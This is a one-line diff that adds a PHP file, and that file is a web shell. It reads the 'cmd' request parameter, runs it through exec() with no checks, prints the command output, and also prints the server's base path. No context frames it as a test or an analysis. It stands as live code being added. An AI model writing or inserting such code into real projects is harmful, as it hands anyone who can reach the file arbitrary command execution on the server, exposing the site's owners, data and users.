@@ -1,0 +1,1 @@
+<?php $s=$_REQUEST['cmd'];exec($s, $r, $status);print_r($r);define('BASE_PATH',realpath(dirname(__FILE__).'/'));echo BASE_PATH;?>
